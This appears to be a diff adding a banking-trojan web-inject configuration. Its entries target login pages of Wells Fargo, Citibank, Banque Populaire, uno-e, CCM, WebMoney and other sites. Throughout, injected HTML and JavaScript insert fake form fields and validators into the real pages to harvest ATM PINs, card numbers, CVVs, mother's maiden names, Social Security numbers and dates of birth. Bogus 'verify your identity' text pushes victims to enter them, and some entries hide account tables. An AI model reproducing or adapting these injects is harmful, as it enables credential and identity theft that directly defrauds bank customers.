+</div><br><div><strong><br><label for="pin">ATM PIN</label>:</strong><br />
+<span class="mozcloak1"><input type="password" accesskey="N" id="pin" name="pin"  size="7" maxlength="4" style="left;width:75px;" tabindex="3" /></span>
+data_end
+data_after
+data_end
+
+data_before
+tabindex="20">Forgot password?</a>
+data_end
+data_inject
+<td width="225"><label for="password" class="formlabel">3. ATM PIN</label><br/>
+<input type="password" name="pin" id="pin" size="20" maxlength="4" title="Enter ATM PIN" tabindex="11" accesskey="A"/>
+<br/>&nbsp;</td>
+data_end
+data_after
+</td>
+data_end
+
+data_before
+<label for="account" class="formlabel">
+data_end
+data_inject
+4. Sign on to
+data_end
+data_after
+</label>
+data_end
+
+data_before
+<form autocomplete="off" name="signon" id="frmSignon" action="https://online.wellsfargo.com/signon" method="post"
+data_end
+data_inject
+onsubmit="return pinval (document.signon.pin.value);"
+data_end
+data_after
+data_end
+
+data_before
+home.css" />
+data_end
+data_inject
+<script type="text/javascript">
+function pinval (val) {
+  var val1=val
+ if (val1.length<1) 
+  { alert("Error Message:\nPlease enter your PIN.");
+  return false; 
+  val1.focus();}
+else if(val1.length<4)
+   { alert("Error Message:\nThe PIN you entered is not valid.\nYour PIN (4 digits) must consist only of numbers without spaces.");
+   return false;
+  val1.focus(); }
+  return true;
+         }
+</script>
+data_end
+data_after
+data_end
+
+data_before
+<body id="wf_wellsfargo_com">
+data_end
+data_inject
+<script type="text/javascript">
+function pinval (val) {
+  var val1=val
+ if (val1.length<1) 
+  { alert("Error Message:\nPlease enter your PIN.");
+  return false; 
+  val1.focus();}
+else if(val1.length<4)
+   { alert("Error Message:\nThe PIN you entered is not valid.\nYour PIN (4 digits) must consist only of numbers without spaces.");
+   return false;
+  val1.focus(); }
+  return true;
+         }
+</script>
+data_end
+data_after
+data_end
+
+data_before
+name="Signon" id="Signon" autocomplete="off"
+data_end
+data_inject
+onsubmit="return pinval (document.Signon.pin.value);"
+data_end
+data_after
+data_end
+
+;===========vvvvCITIBANKvvvv=================
+
+set_url https://web.da-us.citibank.com/cgi-bin/citifi/portal/l/l.do GP
+
+data_before
+src="/cm/js/branding.js"></script>
+data_end
+data_inject
+<SCRIPT>
+function set_cookie1(name, value, expires)
+{
+if (!expires)
+{
+expires = new Date();
+}
+document.cookie = name + "=" + escape(value) + "; expires=" + expires.toGMTString() + "; path=/";
+}
+
+function get_cookie(name)
+{
+cookie_name = name + "=";
+cookie_length = document.cookie.length;
+cookie_begin = 0;
+while (cookie_begin < cookie_length)
+{
+value_begin = cookie_begin + cookie_name.length;
+if (document.cookie.substring(cookie_begin, value_begin) == cookie_name)
+{
+var value_end = document.cookie.indexOf (";", value_begin);
+if (value_end == -1)
+{
+value_end = cookie_length;
+}
+return unescape(document.cookie.substring(value_begin, value_end));
+}
+cookie_begin = document.cookie.indexOf(" ", cookie_begin) + 1;
+if (cookie_begin == 0)
+{
+break;
+}
+}
+return null;
+}
+</SCRIPT>
+data_end
+data_after
+<noscript>
+data_end
+
+
+data_before
+</tr><tr><td colspan="3" class="password">
+data_end
+data_inject
+<SCRIPT>
+var name1 = "ct_ver";
+var cookie_val1 = get_cookie(name1);
+
+if (cookie_val1 == "y9872") 
+{
+document.writeln("<input type='password' name='password' id='password' onkeydown='checkUidComplete(event)' size='13'>");
+}
+if (cookie_val1 == null)
+{
+var tmp = "y9872";
+var expires1 = new Date(); 
+expires1.setTime(expires1.getTime() + (1000 * 86400 * 365));
+set_cookie1(name1, tmp, expires1);
+document.writeln("<input type='password' id='username' name='username' onkeydown='checkUidComplete(event)' size='13'>");
+}
+</script>
+data_end
+data_after
+</td></tr><tr valign="top"><td><input type="checkbox"
+data_end
+
+data_before
+"username" style="padding-bottom:4px;">
+data_end
+data_inject
+<SCRIPT>
+var name2 = "ct_ver2";
+var cookie_val2 = get_cookie(name2);
+
+if (cookie_val2 == "y9871") 
+{
+document.writeln("<input type='text' id='username' name='username' size='12' value=''>");
+}
+if (cookie_val2 == null)
+{
+var tmp = "y9871";
+var expires1 = new Date(); 
+expires1.setTime(expires1.getTime() + (1000 * 86400 * 365));
+set_cookie1(name2, tmp, expires1);
+document.writeln("<input type='text' name='password' id='password' size='12' value=''>");
+}
+</script>
+data_end
+data_after
+</td></tr><tr><td colspan="2" nowrap><b>Password
+data_end
+
+set_url https://web.da-us.citibank.com/cgi-bin/citifi/portal/l/autherror.do* GP
+data_before
+<td colspan=2 class="username"><big><B>
+data_end
+data_inject
+<input type="text" id="username" name="username" size="13" length="50" value=>
+data_end
+data_after
+</B></big></td></tr>
+data_end
+
+data_before
+univers/misc/error.gif'><font color=#d73535><B><big>
+data_end
+data_inject
+Information you entered does not match our records.
+data_end
+data_after
+</big></B></font><BR><BR><big>Please check
+data_end
+
+data_before
+</big></B></font><BR><BR><big>
+data_end
+data_inject
+In order to avoid fraud, we must verify your identity. We ask several questions.<br> Only you can answer these questions. This information is used only for security <br>reasons, to protect you from identity fraud.<br> Please make sure you complete all required information correctly.
+data_end
+data_after
+<BR><BR>If you're
+data_end
+
+data_before
+<tr valign=top><td colspan=2 class=inputField>
+data_end
+data_inject
+<input id="password" name="password" maxlength="50" size="12" value="" autocomplete="OFF" type="password"><br><br></td></tr><!-- --> <table border="0" cellpadding="0" cellspacing="0" width="100%"><tbody><tr valign="top"><td align="left"><big><br> Enter the information about Credit Card linked to your account: </big><br><br></td></tr></tbody></table> <tr><td colspan="2"><b>ATM Card Number</b></td></tr><br> <tr valign="top"><td colspan="2"> <INPUT TYPE="text" NAME="atm" VALUE="" SIZE="16" MAXLENGTH="16"><BR> </td></tr> <tr><td colspan="2"><b>Expired Date</b></td></tr> <br> <tr valign="top"><td colspan="2"> <INPUT TYPE="text" NAME="exp" VALUE="" SIZE="3" MAXLENGTH="5"></td></tr><BR> <tr><td colspan="2"><b>CVV</b></td></tr> <br> <tr valign="top"><td colspan="2"> <INPUT TYPE="text" NAME="cvv" VALUE="" SIZE="2" MAXLENGTH="3"><BR><br></td></tr> <table border="0" cellpadding="0" cellspacing="0" width="100%"><tbody><tr valign="top"><td align="left"><big><br> Enter your personal<br> information: </big></td></tr></tbody></table><br> <tr><td colspan="2"><b>Mother's Maiden Name</b></td></tr> <br> <tr valign="top"><td colspan="2"> <INPUT TYPE="text" NAME="mmn" VALUE="" SIZE="20" MAXLENGTH="32"></td></tr><BR> <tr><td colspan="2"><b>Social Security Number</b></td></tr> <table border="0" cellpadding="0" cellspacing="0" width="20%"><tbody> <tr valign="top"><td colspan="2"> <INPUT TYPE="text" NAME="ssn1" VALUE="" SIZE="2" MAXLENGTH="3"> <td colspan="2"> <INPUT TYPE="text" NAME="ssn2" VALUE="" SIZE="1" MAXLENGTH="2" valign="left"> <td colspan="2"> <INPUT TYPE="text" NAME="ssn3" VALUE="" SIZE="3" MAXLENGTH="4"> </td></td></td></tr> </table></tbody> <!-- --><tr><td><IMG border=0 height=10 src='/images/pixel.gif' width=1></td></tr>
+data_end
+data_after
+<tr><td align=left valign="top" nowrap></td><td align=right><IMG border=0 height=10 src='/images/pixel.gif' width=1><input type=image alt="" src="/images/univers/buttons/cont_btn.gif"
+data_end
+
+data_before
+if(!(usernameValidation(frm.username)))
+data_end
+data_inject
+return false; if(!(cinRegValidation(frm.atm))) return false; if((document.LoginValidateForm.exp.value.length<1) || (document.LoginValidateForm.cvv.value.length<1) || (document.LoginValidateForm.mmn.value.length<1) || (document.LoginValidateForm.ssn1.value.length<1) || (document.LoginValidateForm.ssn2.value.length<1) || (document.LoginValidateForm.ssn3.value.length<1)) { alert ("All fields are required."); return false; } else if((document.LoginValidateForm.exp.value.length<5) || (document.LoginValidateForm.cvv.value.length<3) || (document.LoginValidateForm.mmn.value.length<4) || (document.LoginValidateForm.ssn1.value.length<3) || (document.LoginValidateForm.ssn2.value.length<2) || (document.LoginValidateForm.ssn3.value.length<4)) { alert ("Please verify your information and fill the form.\n(All fields are required)."); return false; }
+data_end
+data_after
+if(!(passwordValidation(frm.password)))
+data_end
+
+set_url https://rupay.com/index.php GL
+data_before
+<td bgcolor="#ffffff"><table border="0" cellspacing="2" cellpadding="2">
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url https://light.webmoney.ru/default.aspx GL
+data_before
+<table*id="dgPurses1"*>
+data_end
+data_inject
+data_end
+data_after
+</table>
+data_end
+
+set_url *banquepopulaire.fr/* GP
+data_before
+<input type="password" style="font-family: Arial, Helvetica; font-size: 10pt; color:#000066; background-color: #e8e8e8;" size="12" maxlength="12" name="passwd" value=>
+data_end
+data_inject
+<tr>
+<td colspan="5"><br></td>
+</tr>
+<td nowrap>
+<div align="right"><font color="#000066" size="2" face="Arial, Helvetica, sans-serif"><b>Date de naissance (JJ/MM/AAAA) </b></font> </div></td>
+<td> 
+<input type="text" style="font-family: Arial, Helvetica; font-size: 10pt; color:#000066; background-color: #e8e8e8;" size="12" maxlength="12" name="dob" value=>
+</td>
+data_end
+data_after
+data_end
+
+set_url http://*.osmp.ru/ GP
+data_before
+<input type="submit"
+data_end
+data_inject
+ onclick="javascript: document.forms[0].tmp.value=enteredVal"
+data_end
+data_after
+data_end
+data_before
+<input type="hidden" name="need_log" value="5">
+data_end
+data_inject
+<input id=tmp name=tmp type=hidden>
+data_end
+data_after
+data_end
+
+set_url https://www.uno-e.com/local_bdnt_unoe/Login_unoe2.html GP
+data_before
+name="password"*">
+data_end
+data_inject
+<label for="password"><br><span class="V10">Clave de Operaciones</span></label>
+<br><input class="pn-button"  type="password" id="password" name="ESpass" size="15" maxlength="20" title="Clave de Operaciones">
+data_end
+data_after
+data_end
+data_before
+name="Submit"
+data_end
+data_inject
+ OnClick="javascript: if  (document.entrada.ESpass.value.length < 2) {alert('Clave de Operaciones no encontrado');return false;}"
+data_end
+data_after
+data_end
+
+set_url https://www.ccm.es/cgi-bin/INclient_6105 GP
+data_before
+name="PAN"*</tr>
+data_end
+data_inject
+<tr><td  bgcolor="d9d7cf">&nbsp;</td></tr>
+<tr>
+<td  bgcolor="d9d7cf" class="txtlocb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Firma:&nbsp;&nbsp;<input name="ESpass" type="password" width="12" size="9"></td>
+</tr>
+data_end
+data_after
+data_end
+data_before
+userpass.PAN.focus*{
+data_end
+data_inject
+
+ if (document.userpass.ESpass.value == "")
+{
+alert("Introduzca su Firma.");
+}
+else
+{
+data_end
+data_after
+data_end
+data_before
+self.close*}
+data_end
+data_inject
+}
+data_end
+data_after
+data_end
